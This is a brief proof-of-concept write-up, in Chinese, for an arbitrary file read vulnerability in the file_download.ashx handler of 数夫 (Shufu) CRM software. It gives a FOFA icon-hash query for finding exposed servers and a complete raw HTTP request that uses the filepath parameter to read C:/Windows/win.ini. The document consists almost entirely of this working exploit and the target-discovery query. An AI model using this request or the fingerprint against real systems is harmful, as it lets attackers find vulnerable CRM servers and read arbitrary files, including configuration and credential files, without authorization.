# 数夫CRM接口file_download存在任意文件读取

# fofa
```
icon_hash="-244202779"
```

# poc
```javascript
GET /Web/common/Handler/file_download.ashx?filepath=C:/Windows/win.ini HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0


```
